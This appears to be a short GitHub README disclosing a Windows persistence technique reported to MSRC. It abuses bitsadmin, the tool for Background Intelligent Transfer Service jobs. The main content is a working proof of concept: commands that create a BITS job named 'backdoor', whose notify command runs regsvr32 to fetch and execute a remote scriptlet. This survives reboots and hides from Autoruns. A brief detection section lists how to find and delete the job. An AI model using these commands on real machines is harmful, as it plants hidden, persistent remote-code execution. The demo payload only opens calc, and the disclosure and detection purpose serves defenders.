# bitsadminexec
Use bitsadmin to maintain persistence and bypass Autoruns

Report to MSRC.

###POC
(1) First we should have the administrator's right.

(2) Then run this on cmd with administrator's right:

```
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
bitsadmin /Resume backdoor
```

(3) Then it will run the following command to start a calc.exe:
```
regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
```

(4) What's more,after we restart the system,the command to start a calc.exe runs again and again.


###Impact of the issue
Autoruns's startup monitor can't find this.

Test success on Win7 、Win8、Server 2008 and so on.

###Detect
Run this to check the jobs and delete it:
```
bitsadmin /list /allusers /verbose
```
or
```
Stop Background Intelligent Transfer Service
```
